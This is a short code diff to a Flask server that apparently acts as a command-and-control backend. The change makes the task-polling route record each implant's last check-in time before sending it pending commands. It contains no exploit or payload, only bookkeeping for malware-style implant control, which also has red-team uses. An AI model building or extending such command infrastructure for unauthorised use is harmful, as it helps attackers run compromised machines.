@@ -81,6 +81,11 @@ def createtask(ProductID):
 
 @app.route('/tasks/<ProductID>', methods=['GET'])
 def get_tasks(ProductID):
+	# Update last checkin time
+	implant = Implant.query.get(ProductID)
+	implant.last_checkin = datetime.utcnow()
+	db.session.commit()
+	# Send pending commands to implant
 	tasks = Task.query.filter_by(implant_id=ProductID).all()
 	strTasks = []
 	for task in tasks:
